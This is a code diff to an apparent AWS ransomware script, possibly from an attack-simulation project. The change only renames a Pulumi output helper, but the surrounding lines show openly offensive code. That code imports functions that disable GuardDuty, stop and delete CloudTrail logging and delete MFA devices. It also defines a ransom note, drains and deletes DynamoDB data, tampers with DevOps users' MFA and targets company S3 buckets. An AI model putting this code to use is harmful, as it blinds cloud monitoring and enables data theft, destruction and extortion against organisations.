@@ -4,7 +4,7 @@ import os
 import time
 from DisableGD_CT import disable_guardduty, stop_cloudtrail_logging, delete_guardduty, delete_cloudtrail
 from MFA import delete_virtualMFA_device
-from Load_Pulumi_Outputs import get_pulumi_output
+from Load_Pulumi_Outputs import get_infrastructure_output
 
 
 ransom_message = """YOUR DATA HAS BEEN TAKEN.
@@ -68,9 +68,9 @@ class Ransomware:
         self.dynamodb_drain = self.DynamoDB_Drain_Delete(self.session)
 
 
-        # Dynamically fetching GuardDuty and CloudTrail details from Pulumi outputs 
-        self.guardduty_id = get_pulumi_output("gd_detector_id")  
-        self.cloudtrail_name = get_pulumi_output("cloudtrail_name") 
+        # Dynamically fetching GuardDuty and CloudTrail details from infrastructure outputs 
+        self.guardduty_id = get_infrastructure_output("gd_detector_id")  
+        self.cloudtrail_name = get_infrastructure_output("cloudtrail_name") 
 
 
 
@@ -83,7 +83,7 @@ class Ransomware:
         MFA Tampering DDOS as part of the larger vector.
         """
         self.devops_mfa_arns = {
-            username: get_pulumi_output(f"{username}_mfa_arn")
+            username: get_infrastructure_output(f"{username}_mfa_arn")
             for username in ["DevopsDeploy", "DevopsAutomation", "DevopsMonitor", "DevopsPipeline"]
         }
 
@@ -179,7 +179,7 @@ class Ransomware:
             """Fetch all S3 buckets & filter by predefined naming patterns"""
             all_buckets = self.s3_client.list_buckets().get('Buckets', [])
 
-            # Convert Pulumi bucket names to lowercase for comparison
+            # Convert infrastructure bucket names to lowercase for comparison
             s3_target_patterns = [
                 "company-data-q1-2024", "company-data-q2-2024",
                 "company-data-q3-2024", "company-data-q4-2024",
